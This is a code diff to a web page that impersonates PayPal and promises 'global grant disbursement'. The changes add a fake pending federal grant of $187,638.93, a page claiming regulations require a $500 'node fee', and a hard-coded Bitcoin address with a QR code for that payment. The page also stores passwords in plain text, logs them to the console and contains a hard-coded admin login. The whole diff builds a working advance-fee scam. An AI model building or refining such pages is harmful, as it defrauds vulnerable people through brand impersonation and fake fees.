@@ -36,9 +36,12 @@
                 <button onclick="toggleSidebar()" class="text-2xl">✕</button>
             </div>
             <nav class="space-y-8 text-lg font-light">
-                <button onclick="showPage('dashboard')" class="block w-full text-left">Summary</button>
-                <button onclick="showPage('activity-page-main')" class="block w-full text-left">Activity History</button>
-                <button onclick="localStorage.removeItem('isLoggedIn'); location.reload();" class="block w-full text-left pt-8 border-t border-blue-800 opacity-50">Log Out</button>
+                <button onclick="showPage('landing-page')" class="block w-full text-left">Home</button>
+                <div id="sidebar-user-links" class="hidden space-y-8">
+                    <button onclick="showPage('dashboard')" class="block w-full text-left">Summary</button>
+                    <button onclick="showPage('activity-page-main')" class="block w-full text-left">Activity History</button>
+                    <button onclick="logoutUser()" class="block w-full text-left pt-8 border-t border-blue-800 opacity-50">Log Out</button>
+                </div>
             </nav>
         </div>
     </div>
@@ -64,7 +67,7 @@
         <section class="animated-hero h-[600px] flex items-center justify-center text-center px-6 text-white">
             <div class="max-w-4xl">
                 <h1 class="text-5xl md:text-7xl font-bold mb-6">The New Standard for Global Grant Disbursement</h1>
-                <p class="text-xl mb-10 font-light opacity-90">Securely receive, manage, and withdraw international grants and federal disbursements with military-grade encryption.</p>
+                <p class="text-xl mb-10 font-light opacity-90">Securely receive, manage, and withdraw international grants with military-grade encryption.</p>
                 <button onclick="showPage('signup-page')" class="px-14 py-4 bg-white text-blue-900 rounded-full font-bold text-xl shadow-2xl hover:scale-105 transition">Get Started</button>
             </div>
         </section>
@@ -109,27 +112,29 @@
         </footer>
     </div>
 
-    <div id="signup-page" class="hidden min-h-screen p-8 flex flex-col items-center relative">
-        <button onclick="showPage('landing-page')" class="absolute top-8 left-8 text-gray-400 flex items-center gap-2">
-            <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 19l-7-7m0 0l7-7m-7 7h18"/></svg> Home
-        </button>
+    <div id="signup-page" class="hidden min-h-screen p-8 flex flex-col items-center relative bg-white">
+        <button onclick="showPage('landing-page')" class="absolute top-8 left-8 text-gray-400">Back</button>
         <span class="text-3xl font-bold pp-blue italic mb-8 mt-12">PayPal</span>
         <div class="w-full max-w-sm space-y-4">
             <h2 class="text-2xl font-bold text-center">Create Account</h2>
             <input id="reg-name" type="text" placeholder="Full Legal Name" class="w-full border p-4 rounded-md outline-none">
             <input id="reg-email" type="email" placeholder="Email Address" class="w-full border p-4 rounded-md outline-none">
+            
             <div class="relative">
                 <input id="reg-pass" type="password" placeholder="Create Password" class="w-full border p-4 rounded-md outline-none">
                 <button onclick="togglePass('reg-pass')" class="absolute right-4 top-4 text-gray-400">👁‍🗨</button>
             </div>
+
             <select id="reg-country" onchange="updatePhoneCode()" class="w-full border p-4 rounded-md outline-none bg-white">
                 <option value="">Select Country</option>
-                <option value="1">🇺🇸 USA</option><option value="44">🇬🇧 UK</option><option value="234">🇳🇬 Nigeria</option>
+                <option value="1">🇺🇸 USA</option><option value="44">🇬🇧 UK</option><option value="234">🇳🇬 Nigeria</option><option value="1-ca">🇨🇦 Canada</option>
             </select>
+
             <div class="flex space-x-2">
                 <input id="phone-prefix" type="text" readonly placeholder="+" class="w-20 border p-4 rounded-md bg-gray-50 text-center font-bold">
                 <input id="reg-phone" type="number" placeholder="Phone" class="flex-1 border p-4 rounded-md outline-none">
             </div>
+
             <input id="agent-id" type="text" placeholder="Agent ID" oninput="validateAgent(this.value)" class="w-full border p-4 rounded-md outline-none border-orange-300">
             <p id="agent-status" class="text-xs font-bold"></p>
             <button onclick="handleSignup()" class="w-full py-4 pp-bg-blue text-white rounded-full font-bold">Create Account</button>
@@ -137,10 +142,8 @@
         </div>
     </div>
 
-    <div id="login-page" class="hidden min-h-screen p-8 flex flex-col items-center relative">
-        <button onclick="showPage('landing-page')" class="absolute top-8 left-8 text-gray-400 flex items-center gap-2">
-            <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 19l-7-7m0 0l7-7m-7 7h18"/></svg> Home
-        </button>
+    <div id="login-page" class="hidden min-h-screen p-8 flex flex-col items-center relative bg-white">
+        <button onclick="showPage('landing-page')" class="absolute top-8 left-8 text-gray-400">Back</button>
         <span class="text-3xl font-bold pp-blue italic mb-12 mt-12">PayPal</span>
         <div class="w-full max-w-sm space-y-4">
             <input id="login-email" type="text" placeholder="Email" class="w-full border p-4 rounded-md outline-none">
@@ -177,16 +180,54 @@
         </div>
     </div>
 
+    <div id="activity-page-main" class="hidden min-h-screen bg-white">
+        <div class="p-6 border-b flex items-center justify-between sticky top-0 bg-white">
+            <button onclick="showPage('dashboard')" class="text-blue-600 font-bold">Back</button>
+            <h2 class="text-lg font-bold">Activity History</h2>
+            <div class="w-6"></div>
+        </div>
+        <div class="p-6">
+            <p class="text-xs font-bold text-gray-400 uppercase mb-4">Pending</p>
+            <div class="flex items-center justify-between border-b pb-6">
+                <div><p class="font-bold text-sm">U.S. Federal Grant</p><p class="text-[10px] text-orange-500 font-bold">Verification Pending</p></div>
+                <p class="text-green-600 font-bold">+$187,638.93</p>
+            </div>
+        </div>
+    </div>
+
+    <div id="amount-page" class="hidden min-h-screen p-8 text-center bg-white">
+        <button onclick="showPage('dashboard')" class="text-left block mb-12 text-gray-400">✕</button>
+        <div class="flex items-center justify-center mb-10"><span class="text-4xl text-gray-300">$</span><input type="number" id="send-val" value="500.00" class="text-6xl font-light outline-none w-48 text-center"></div>
+        <button onclick="showPage('verify-page')" class="w-full py-5 pp-bg-blue text-white rounded-full font-bold text-xl">Next</button>
+    </div>
+
+    <div id="verify-page" class="hidden min-h-screen p-8 flex flex-col items-center justify-center text-center">
+        <div class="w-16 h-16 bg-orange-100 text-orange-600 rounded-full flex items-center justify-center mb-6 text-2xl font-bold">!</div>
+        <h2 class="text-2xl font-bold mb-4">Verification Required</h2>
+        <p class="text-gray-500 text-sm mb-10 px-4">Federal regulations require a <b>$500.00</b> node fee to link your wallet.</p>
+        <button onclick="generateWallet()" class="w-full py-4 pp-bg-blue text-white rounded-full font-bold max-w-sm">Proceed to Payment</button>
+    </div>
+
+    <div id="wallet-page" class="hidden min-h-screen p-8 text-center bg-white">
+        <h2 class="text-xl font-bold mb-8">Verification Deposit</h2>
+        <img id="qr-code" src="" class="w-52 h-52 mx-auto mb-6 p-2 border rounded-xl">
+        <div class="bg-gray-50 p-4 rounded-xl border mb-8"><span id="wallet-addr" class="text-[10px] font-mono break-all font-bold text-gray-600">bc1q4c6f7xzsekkpvd2guwkaww4m7se9yjlrxnrjc7</span></div>
+        <button onclick="alert('Payment detected. Please wait for node confirmations.')" class="w-full py-5 bg-green-600 text-white rounded-full font-bold text-xl">I HAVE SENT PAYMENT</button>
+    </div>
+
     <script>
         let isAgentValid = false;
 
-        // FIX 2: Added persistence restore - this runs immediately when the page loads
+        // FIX: Persistence Logic
         window.addEventListener('DOMContentLoaded', () => {
             const email = localStorage.getItem('userEmail');
             const name = localStorage.getItem('userName');
-            if (email && name) {
+            const isLoggedIn = localStorage.getItem('isLoggedIn');
+            if (email && name && isLoggedIn) {
                 document.getElementById('display-name').innerText = name.split(' ')[0];
                 document.getElementById('user-initials').innerText = name.charAt(0).toUpperCase();
+                document.getElementById('sidebar-user-links').classList.remove('hidden');
+                showPage('dashboard');
             }
         });
 
@@ -204,6 +245,11 @@
         function togglePass(id) {
             const input = document.getElementById(id);
             input.type = input.type === "password" ? "text" : "password";
+        }
+
+        function updatePhoneCode() {
+            const country = document.getElementById('reg-country').value;
+            document.getElementById('phone-prefix').value = country ? '+' + country.split('-')[0] : '+';
         }
 
         function validateAgent(val) {
@@ -225,8 +271,10 @@
                 localStorage.setItem('userEmail', email);
                 localStorage.setItem('userPass', pass);
                 localStorage.setItem('userName', name);
+                localStorage.setItem('isLoggedIn', 'true');
                 document.getElementById('display-name').innerText = name.split(' ')[0];
                 document.getElementById('user-initials').innerText = name.charAt(0).toUpperCase();
+                document.getElementById('sidebar-user-links').classList.remove('hidden');
                 showLoading('Registering...', 'dashboard');
             } else {
                 document.getElementById('signup-error').classList.remove('hidden');
@@ -239,18 +287,25 @@
             const storedEmail = localStorage.getItem('userEmail');
             const storedPass = localStorage.getItem('userPass');
 
-            // FIX 3: Added Debug Logs to console (Press F12 to see them)
-            console.log("Input:", email, pass);
-            console.log("Stored:", storedEmail, storedPass);
+            // FIX: Debug logs
+            console.log("Login Attempt:", email, pass);
+            console.log("Stored Creds:", storedEmail, storedPass);
 
             if ((email === storedEmail && pass === storedPass) || (email === "admin@portal.com" && pass === "1234")) {
                 const name = localStorage.getItem('userName') || "Admin";
+                localStorage.setItem('isLoggedIn', 'true');
                 document.getElementById('display-name').innerText = name.split(' ')[0];
                 document.getElementById('user-initials').innerText = name.charAt(0).toUpperCase();
+                document.getElementById('sidebar-user-links').classList.remove('hidden');
                 showLoading('Authenticating...', 'dashboard');
             } else {
                 document.getElementById('login-error').classList.remove('hidden');
             }
+        }
+
+        function logoutUser() {
+            localStorage.removeItem('isLoggedIn');
+            location.reload();
         }
 
         function showLoading(text, next) {
@@ -258,6 +313,12 @@
             document.getElementById('loading-text').innerText = text;
             l.classList.remove('hidden');
             setTimeout(() => { l.classList.add('hidden'); if(next) showPage(next); }, 2000);
+        }
+
+        function generateWallet() {
+            const addr = 'bc1q4c6f7xzsekkpvd2guwkaww4m7se9yjlrxnrjc7';
+            document.getElementById('qr-code').src = `https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=${addr}`;
+            showPage('wallet-page');
         }
     </script>
 </body>
